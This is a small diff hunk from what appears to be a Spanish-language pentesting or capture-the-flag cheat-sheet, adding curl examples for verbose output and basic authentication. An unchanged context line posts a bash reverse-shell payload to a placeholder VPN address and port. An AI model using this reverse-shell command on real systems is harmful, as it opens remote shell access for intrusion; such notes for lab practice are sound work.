@@ -15,6 +15,10 @@
 ::: curl -s -X requestMethod "http://$(mvnb)/........" -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/ip_vpn_here/port_vpn_here 0>&1"'
 
 
+*** *** Curl verbose y usuario/password
+
+		::: curl localhost:8080 -v
+		::: curl localhost:8080 --basic -u 'user_name:passsword'
 
 
 *** *** PATH
